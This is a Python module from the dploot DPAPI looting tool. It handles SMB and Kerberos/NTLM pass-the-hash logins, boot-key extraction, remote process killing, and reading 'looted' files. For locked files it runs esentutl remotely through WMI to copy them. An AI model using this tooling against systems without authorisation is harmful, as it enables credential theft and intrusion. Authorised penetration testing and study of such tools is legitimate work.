import ntpath
import os
import logging
import time
from typing import Any, Dict, List, Optional

from dploot.lib.target import Target

from impacket.smbconnection import SMBConnection
from impacket.winregistry import Registry
from impacket.smb import ATTR_DIRECTORY
from impacket.smb import SMB_DIALECT
from impacket.smb import SharedFile
from impacket.nmb import NetBIOSTimeout
from impacket.dcerpc.v5 import tsts
from impacket.examples.secretsdump import RemoteOperations, LocalOperations
from impacket.smb3structs import (
    FILE_READ_DATA,
    FILE_OPEN,
    FILE_NON_DIRECTORY_FILE,
    FILE_SHARE_READ,
)

from dploot.lib.wmi import DPLootWmiExec


class DPLootSMBConnection:

    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    
    # if called with target = LOCAL, return an instance of DPLootLocalSMConnection,
    # else return an instance of DPLootRemoteSMBConnection
    def __new__(
        cls, target=None
    ) -> "DPLootRemoteSMBConnection | DPLootLocalSMBConnection":
        if (
            target is not None
            and target.address.upper() == "LOCAL"
            and cls.__name__ != DPLootLocalSMBConnection.__name__
        ):
            return DPLootLocalSMBConnection.__new__(DPLootLocalSMBConnection, target)
        elif cls.__name__ == DPLootSMBConnection.__name__:
            return DPLootRemoteSMBConnection.__new__(DPLootRemoteSMBConnection, target)
        else:
            # we end up here when a child class is instantiated.
            return super().__new__(cls)

    def __init__(self, target: Target) -> None:
        self.target = target
        self.remote_ops = None
        self.local_session = None

        self._usersProfiles = None

    def listDirs(self, share: str, dirlist: List[str]) -> Dict[str, Any]:
        result = {}
        for path in dirlist:
            tmp = self.remote_list_dir(share, path=path)
            result[path] = tmp
        return result

class DPLootRemoteSMBConnection(DPLootSMBConnection):
    def __init__(self, target: Target) -> None:
        super().__init__(target)

        self.smb_session = None
        self.smbv1 = False

    def create_smbv1_conn(self, kdc=""):
        try:
            self.smb_session = SMBConnection(
                kdc if kdc else self.target.address,
                kdc if kdc else self.target.address,
                None,
                preferredDialect=SMB_DIALECT,
            )
            self.smbv1 = True
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                logging.debug(
                    f"SMBv1 might be disabled on {kdc if kdc else self.target.address}"
                )
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug(
                f"Error creating SMBv1 connection to {kdc if kdc else self.target.address}: {e}"
            )
            return False

        return True

    def create_smbv3_conn(self, kdc=""):
        try:
            self.smb_session = SMBConnection(
                kdc if kdc else self.target.address,
                kdc if kdc else self.target.address,
                None,
            )
            self.smbv1 = False
        except OSError as e:
            if str(e).find("Too many open files") != -1:
                logging.error(
                    f"SMBv3 connection error on {kdc if kdc else self.target.address}: {e}"
                )
            return False
        except (Exception, NetBIOSTimeout) as e:
            logging.debug(
                f"Error creating SMBv3 connection to {kdc if kdc else self.target.address}: {e}"
            )
            return False

        return True

    def create_conn_obj(self, kdc=""):
        if self.create_smbv3_conn(kdc) or self.create_smbv1_conn(kdc):
            return True
        logging.debug(
            "Could not create connection object to %s"
            % (kdc if kdc else self.target.address)
        )
        return False

    def connect(self) -> "Any | None":
        try:
            if self.target.do_kerberos:
                # getting hostname
                no_ntlm = False
                if not self.create_conn_obj():
                    return None
                try:
                    self.smb_session.login("", "")
                except Exception as e:
                    if "STATUS_NOT_SUPPORTED" in str(e):
                        no_ntlm = True
                hostname = (
                    self.smb_session.getServerDNSHostName()
                    if not no_ntlm
                    else self.target.address
                )
                self.smb_session.close()
                self.target.address = hostname
                logging.debug("Connecting to %s" % self.target.address)
                if not self.create_conn_obj(self.target.address):
                    return None
                logging.debug(
                    "Authenticating with %s through Kerberos" % self.target.username
                )
                self.smb_session.kerberosLogin(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                    aesKey=self.target.aesKey,
                    kdcHost=self.target.kdcHost,
                    useCache=self.target.use_kcache,
                )
                self.target.username = self.smb_session.getCredentials()[0]
            else:
                logging.debug("Connecting to %s" % self.target.address)
                if not self.create_conn_obj():
                    return None
                logging.debug(
                    "Authenticating with %s through NTLM" % self.target.username
                )
                self.smb_session.login(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
            return None
        return self.smb_session

    def remote_list_dir(self, share, path, wildcard=True) -> "Any | None":
        if wildcard:
            path = ntpath.join(path, "*")
        try:
            return self.smb_session.listPath(
                shareName=share, path=ntpath.normpath(path)
            )

        except Exception:
            return None

    def is_admin(self) -> bool:
        try:
            self.smb_session.connectTree("C$")
            is_admin = True
        except Exception:
            is_admin = False
        return is_admin

    def listPath(self, *args, **kwargs) -> Any:
        return self.smb_session.listPath(*args, **kwargs)
    
    def list_users(self, share):
        users_dir_path = "Users\\*"
        directories = self.listPath(
            shareName=share, path=ntpath.normpath(users_dir_path)
        )
        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]

    def reconnect(self) -> bool:
        self.smb_session.reconnect()
        if self.remote_ops is not None:
            self.enable_remoteops(force=True)

    def enable_remoteops(self, force=False) -> None:
        logging.getLogger("impacket").disabled = True
        if self.remote_ops is not None and self.bootkey is not None and not force:
            return
        try:
            self.remote_ops = RemoteOperations(
                self.smb_session, self.target.do_kerberos, self.target.dc_ip
            )
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            logging.error(f"RemoteOperations failed: {e}")

    def getFile(self, *args, **kwargs) -> "Any | None":
        return self.smb_session.getFile(*args, **kwargs)

    def readFile(
        self,
        shareName,
        path,
        mode=FILE_OPEN,
        offset=0,
        password=None,
        shareAccessMode=FILE_SHARE_READ,
        bypass_shared_violation=False,
        looted_files=None
    ) -> bytes:
        # ToDo: Handle situations where share is password protected
        path = path.replace("/", "\\")
        path = ntpath.normpath(path)
        if len(path) > 0 and path[0] == "\\":
            path = path[1:]
        treeId = self.smb_session.connectTree(shareName)
        fileId = None

        data = None

        try:
            fileId = self.smb_session.openFile(
                treeId,
                path,
                FILE_READ_DATA,
                shareAccessMode,
                FILE_NON_DIRECTORY_FILE,
                mode,
                0,
            )
            fileInfo = self.smb_session.queryInfo(treeId, fileId)
            fileSize = fileInfo["EndOfFile"]
            res = self.smb_session._SMBConnection.getIOCapabilities()
            if (fileSize - offset) < res["MaxReadSize"]:
                # Skip reading 0 bytes files.
                if (fileSize - offset) > 0:
                    data = self.smb_session._SMBConnection.read(
                        treeId, fileId, offset, fileSize - offset
                    )
            else:
                written = 0
                toBeRead = fileSize - offset
                data = b""
                while written < toBeRead:
                    bytesRead = self.smb_session._SMBConnection.read(
                        treeId, fileId, offset, res["MaxReadSize"]
                    )
                    written += len(bytesRead)
                    offset += len(bytesRead)
                    data += bytesRead
        except Exception as e:
            logging.debug(f"Exception occurred while trying to read {path}: {e}")
            if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e) or "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                pass
            elif bypass_shared_violation and "STATUS_SHARING_VIOLATION" in str(e):
                wmiexec = DPLootWmiExec(target=self.target)
                command = (
                    f'cmd.exe /Q /c esentutl.exe /y "C:\\{path}" /d "C:\\Windows\\Temp\\{wmiexec.output}"'
                )
                wmiexec.run(command)
                time.sleep(1)
                while True:
                    try:
                        filepath = ntpath.join("Windows\\Temp\\",wmiexec.output)
                        data = self.readFile(shareName=shareName, path=filepath)
                        break
                    except Exception as e:
                        if str(e).find("STATUS_SHARING_VIOLATION") >= 0:
                            # Output not finished, let's wait
                            time.sleep(1)
                self.smb_session.deleteFile(shareName, wmiexec.output)
            elif str(e).find("Broken") >= 0:
                logging.debug("Connection broken, trying to recreate it")
                self.reconnect()
                data = self.readFile(
                    shareName=shareName,
                    path=path,
                    mode=mode,
                    offset=offset,
                    password=password,
                    shareAccessMode=shareAccessMode,
                    bypass_shared_violation=bypass_shared_violation,
                    looted_files=looted_files
                )
            else:
                logging.debug(str(e))
        finally:
            if fileId is not None:
                self.smb_session._SMBConnection.close(treeId, fileId)
            self.smb_session.disconnectTree(treeId)

        if looted_files is not None and data is not None and data != b"":
            looted_files[os.path.join(*(path.split("\\")))]=data
        return data

    def perform_taskkill(self, process_name):
        with tsts.LegacyAPI(self.smb_session, self.target.address, self.target.do_kerberos) as legacy:
            handle = legacy.hRpcWinStationOpenServer()
            r = legacy.hRpcWinStationGetAllProcesses(handle)
            if not len(r):
                logging.debug("Could not get process list")
                return
            pid_list = [
                i["UniqueProcessId"]
                for i in r
                if i["ImageName"].lower() == process_name.lower()
            ]
            if not len(pid_list):
                logging.debug(f"No process {process_name} found")
            logging.debug(f"Found {pid_list} pid(s) for process {process_name}")
            for pid in pid_list:
                logging.debug(f"Killing PID {pid}")
                try:
                    if legacy.hRpcWinStationTerminateProcess(handle, pid)["ErrorCode"]:
                        logging(f"Successfully killed process {pid}")
                    else:
                        logging(f"Could not kill process {pid}")
                except Exception as e:
                    logging.error(f"Error while terminating pid {pid}: {e}")


class DPLootLocalSMBConnection(DPLootSMBConnection):
    systemroot = "C:\\Windows"
    hklm_software_path = r"Windows/System32/config/SOFTWARE"

    def __init__(self, target=None) -> None:
        super().__init__(target)
        self.local_ops = None
        self.local_session = True
        self.smb_session = DPLootDummySession()
        # the following are functions that should never be called on this class.
        self.enable_remoteops = None
        self.reconnect = None


    def connect(self) -> "Any | None":
        return self.smb_session

    def is_admin(self) -> bool:
        return True

    def enable_localops(self, systemHive, force=False) -> None:
        if self.local_ops is not None and self.bootkey is not None and not force:
            return
        try:
            self.local_ops = LocalOperations(systemHive)
            self.bootkey = self.local_ops.getBootKey()
        except Exception as e:
            logging.error(f"LocalOperations failed: {e}")

    # we 'emulate' remote file operations by converting local os.DirEntry() to impacket.SharedFile()
    def _sharedfile_fromdirentry(d: os.DirEntry):
        (filesize, atime, mtime, ctime) = d.stat(follow_symlinks=False)[6:]
        attribs = 0
        if d.is_dir(follow_symlinks=False):
            attribs |= ATTR_DIRECTORY
        return SharedFile(ctime, atime, mtime, filesize, None, attribs, d.name, d.name)

    SharedFile.fromDirEntry = _sharedfile_fromdirentry

    def remote_list_dir(self, share, path, wildcard=True) -> "Any | None":
        path = os.path.join(self.target.local_root, path.replace("\\", os.sep))
        if not wildcard:
            raise NotImplementedError("Not implemented for wildcard == False")
        try:
            result = list(map(SharedFile.fromDirEntry, os.scandir(path)))
        except FileNotFoundError:
            result = []
        return result

    def list_users(self, share):
        users_dir_path = "Users\\*"
        directories = self.listPath(
            shareName=share, path=ntpath.normpath(users_dir_path)
        )
        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]

    def listPath(self, shareName: str = "C$", path: Optional[str] = None, password: Optional[str] = None):
        if path[-2:] == r"\*":
            return self.remote_list_dir(shareName, path[:-2], wildcard=True)
        if path[-1] == "*":
            return self.remote_list_dir(shareName, path[:-1], wildcard=True)
        else:
            raise NotImplementedError("Not implemented for wildcard == False")

    def getFile(self, *args, **kwargs) -> "Any | None":
        raise NotImplementedError("getFile is not implemented in LOCAL mode")

    def readFile(
        self,
        shareName,
        path,
        mode=FILE_OPEN,
        offset=0,
        password=None,
        shareAccessMode=FILE_SHARE_READ,
        bypass_shared_violation=False,
        looted_files=None
    ) -> bytes:
        data = None
        try:
            with open(
                os.path.join(self.target.local_root, path.replace("\\", os.sep)), "rb"
            ) as f:
                data = f.read()
        except Exception as e:
            logging.debug(f"Exception occurred while trying to read {path}: {e}")

        return data

    def getUsersProfiles(self) -> dict[str, str] | None:
        """Returns the list of user profiles (from registry) in a dict

        Each subkey of HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList is a user SID,
        and the ProfileImagePath value inside is the path to the user's profile
        :return: dict of user_sid: path_to_profile

        """
        if self._usersProfiles is not None:
            return self._usersProfiles

        result = {}
        # open hive
        reg_file_path = os.path.join(self.target.local_root, self.hklm_software_path)
        reg = Registry(reg_file_path, isRemote=False)

        # open key
        key_path = "Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
        parentKey = reg.findKey(key_path)
        if parentKey is None:
            logging.error(f"Key {key_path} not found in {reg_file_path}")
            return None

        for user_sid in reg.enumKey(parentKey):
            # get 'ProfileImagePath' value
            (_, path) = reg.getValue(
                ntpath.join(key_path, user_sid, "ProfileImagePath")
            )
            path = (
                path.decode("utf-16le")
                .rstrip("\0")
                .replace(r"%systemroot%", self.systemroot)
            )
            path = ntpath.normpath(path)
            # store in result dict
            result[user_sid] = path

        self._usersProfiles = result
        return self._usersProfiles


class DPLootDummySession:
    def login(*args, **kwargs) -> bool:
        return True
